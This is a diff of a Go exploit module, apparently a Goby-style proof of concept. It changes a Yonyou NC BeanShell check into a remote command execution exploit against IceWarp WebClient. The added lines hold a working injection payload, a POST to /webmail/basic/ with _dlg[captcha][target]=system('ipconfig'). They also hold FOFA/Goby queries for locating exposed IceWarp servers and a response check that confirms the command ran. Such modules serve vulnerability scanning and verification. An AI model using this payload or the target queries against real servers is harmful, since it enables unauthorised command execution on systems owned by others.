@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "IceWarp WebClient basic 远程命令执行漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"IceWarp-公司产品\" || product=\"IceWarp-公司产品\"",
+  "GobyQuery": "app=\"IceWarp-公司产品\" || product=\"IceWarp-公司产品\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +29,15 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/webmail/basic/",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Cookie": "use_cookies=1"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "_dlg[captcha][target]=system(\\'ipconfig\\')\\"
       },
       "ResponseTest": {
         "type": "group",
@@ -42,16 +45,9 @@ func init() {
         "checks": [
           {
             "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "Windows IP",
             "bz": ""
           }
         ]
@@ -107,7 +103,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "IceWarp WebClient basic 远程命令执行漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +112,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "IceWarp WebClient basic rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
